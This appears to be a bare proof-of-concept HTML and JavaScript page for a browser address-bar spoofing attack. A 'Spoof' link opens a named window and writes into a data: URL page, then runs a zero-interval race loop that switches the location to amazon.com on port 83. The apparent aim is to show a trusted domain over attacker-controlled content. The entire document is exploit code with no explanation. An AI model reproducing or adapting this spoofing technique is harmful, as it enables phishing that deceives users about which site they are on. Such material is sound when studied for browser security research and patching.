</head>

<body>
    <a href="javascript:window.open('http://amazon.com:83/','x');" onclick="startSpoof()">Spoof</a>
</body>
    
    <script>
    
    let windowSpoof;

    function race() {
      try {
        windowSpoof.location.href !== 'about:blank';
      }
      catch (e) {
        windowSpoof.location.href='http://amazon.com:83/';
      }
    }
    
    function startSpoof() {

      windowSpoof = window.open("data://google.com,<h1>Test</h1>","x");
      windowSpoof.document.write('http://amazon.com:83/');

      setInterval('race()', 0);
    
    }
   
    </script>
